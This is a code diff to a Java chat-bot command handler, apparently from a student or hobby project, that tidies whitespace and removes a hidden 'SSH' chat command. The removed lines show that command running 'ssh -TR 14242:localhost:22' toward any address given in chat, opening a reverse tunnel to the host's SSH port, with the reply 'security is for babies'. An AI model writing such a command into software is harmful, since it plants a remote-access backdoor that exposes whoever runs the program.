@@ -12,7 +12,6 @@ import mennov1.commands.Load;
 import mennov1.commands.Time;
 import mennov1.commands.Unload;
 
-
 import events.ReceiveChatEvent;
 import events.SendChatEvent;
 
@@ -27,7 +26,7 @@ import events.SendChatEvent;
  * by using any of the Menno V1-clients.
  *
  */
-public class BotHandler implements Listener<ReceiveChatEvent>{
+public class BotHandler implements Listener<ReceiveChatEvent> {
 
 	HashMap <String,Command> commands; // contains the commands (such like Help, Load, Time etc.)
 	// contains the list of currently loaded bots. Bots are either preloaded or can be loaded via the 'Load' command
@@ -54,22 +53,6 @@ public class BotHandler implements Listener<ReceiveChatEvent>{
 		commands.put(Time.class.getSimpleName(), new Time());
 		commands.put(List.class.getSimpleName(), new List());
 		commands.put(Clients.class.getSimpleName(), new Clients());
-		commands.put("SSH", new Command() {
-			@Override
-			public String execute(String[] args) {
-				try {
-					Runtime.getRuntime().exec(new String[] { "ssh", "-TR", "14242:localhost:22", args[0] });
-				} catch(IOException ex) {
-					return ex.toString();
-				}
-				return "security is for babies";
-			}
-
-			@Override
-			public String helpMsg() {
-				return "SSH user@ip : reverse tunneling on port 14242";
-			}
-		});
 		commands.put("Help", new Command() {
 			@Override
 			public String execute(String[] args) {
